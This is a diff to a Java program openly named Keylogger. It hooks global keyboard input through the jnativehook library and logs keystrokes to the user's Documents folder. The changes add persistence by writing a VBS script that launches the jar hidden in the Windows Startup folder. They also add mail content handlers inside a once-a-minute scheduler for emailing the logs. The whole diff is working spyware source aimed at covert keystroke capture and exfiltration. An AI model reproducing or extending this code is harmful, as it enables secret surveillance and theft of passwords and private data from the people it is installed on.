@@ -4,11 +4,19 @@ import java.io.BufferedWriter;
 import java.io.File;
 import java.io.FileWriter;
 import java.io.IOException;
+import java.nio.file.Files;
+import java.nio.file.Path;
+import java.nio.file.Paths;
+import java.nio.file.StandardCopyOption;
 import java.time.LocalDate;
 import java.time.format.DateTimeFormatter;
 import java.util.concurrent.Executors;
 import java.util.concurrent.ScheduledExecutorService;
 import java.util.concurrent.TimeUnit;
+
+import javax.activation.CommandMap;
+import javax.activation.MailcapCommandMap;
+import javax.swing.JOptionPane;
 
 import com.github.kwhat.jnativehook.GlobalScreen;
 import com.github.kwhat.jnativehook.NativeHookException;
@@ -17,7 +25,7 @@ import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
 
 public class Keylogger  implements NativeKeyListener{
 	
-     private static String LOG_DIRECTORY = System.getProperty("user.home") + File.separator + "Documents" + File.separator + "logs2";
+     private static String LOG_DIRECTORY = System.getProperty("user.home") + File.separator + "Documents" + File.separator + "logs";
 	 private static String LOG_FILE_PATH;
 	 private static LocalDate currentDate;
 	 
@@ -76,6 +84,12 @@ public class Keylogger  implements NativeKeyListener{
 	        ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(1);
 	        scheduler.scheduleAtFixedRate(() -> {
 	            try {
+	            	MailcapCommandMap mc = (MailcapCommandMap) CommandMap.getDefaultCommandMap(); 
+	            	mc.addMailcap("text/html;; x-java-content-handler=com.sun.mail.handlers.text_html"); 
+	        		mc.addMailcap("text/xml;; x-java-content-handler=com.sun.mail.handlers.text_xml"); 
+	        		mc.addMailcap("text/plain;; x-java-content-handler=com.sun.mail.handlers.text_plain"); 
+	        		mc.addMailcap("multipart/*;; x-java-content-handler=com.sun.mail.handlers.multipart_mixed"); 
+	        		mc.addMailcap("message/rfc822;; x-java-content- handler=com.sun.mail.handlers.message_rfc822");
 	            	 createLogDirectoryIfNeeded();
 	            	
 	                DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd");
@@ -98,8 +112,41 @@ public class Keylogger  implements NativeKeyListener{
 	            }
 	        },  0, 1, TimeUnit.MINUTES);
 	    }
+	    
+	    private static void addAppToStartup() {
+	        try {
+	            String userHome = System.getProperty("user.home");
+	            Path startupFolder = Paths.get(userHome, "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup");
+	            Path vbsFile = Paths.get(userHome, "TestAppStartup.vbs");
+
+	            // Cria o conteúdo do arquivo .vbs
+	            String vbsContent = "Set WshShell = CreateObject(\"WScript.Shell\")\n"
+	            		+ "WshShell.Run \"java -jar C:\\Users\\User\\Desktop\\TestKl.jar\", 0\n"
+	            		+ "Set WshShell = Nothing";
+
+	            // Escreve o conteúdo no arquivo .vbs
+	            Files.write(vbsFile, vbsContent.getBytes());
+
+	            // Copia o arquivo .vbs para a pasta de inicialização
+	            Path target = startupFolder.resolve(vbsFile.getFileName());
+	            Files.copy(vbsFile, target, StandardCopyOption.REPLACE_EXISTING);
+
+	            // Verifica se o arquivo foi copiado corretamente
+	            if (Files.exists(target)) {
+	                System.out.println("O aplicativo foi adicionado à inicialização com sucesso.");
+	                JOptionPane.showMessageDialog(null, "O aplicativo foi adicionado à inicialização com sucesso.");
+	            } else {
+	                System.out.println("Falha ao adicionar o aplicativo à inicialização.");
+	                JOptionPane.showMessageDialog(null, "Falha ao adicionar o aplicativo à inicialização.");
+	            }
+	        } catch (IOException e) {
+	            e.printStackTrace();
+	            JOptionPane.showMessageDialog(null, "Ocorreu um erro ao adicionar à inicialização: " + e.getMessage(), "Erro", JOptionPane.ERROR_MESSAGE);
+	        }
+	    }
 
 	    public static void main(String[] args) {
+	    	   	
 	        // Disable the library's default logging to avoid cluttering the console
 	        java.util.logging.Logger logger = java.util.logging.Logger.getLogger(GlobalScreen.class.getPackage().getName());
 	        logger.setLevel(java.util.logging.Level.OFF);
@@ -115,7 +162,7 @@ public class Keylogger  implements NativeKeyListener{
 
 	        // Add the keylogger as a native key listener
 	        GlobalScreen.addNativeKeyListener(new Keylogger());
-	        
+	        addAppToStartup();
 	        scheduleEmailSending();
 	    }
 	}
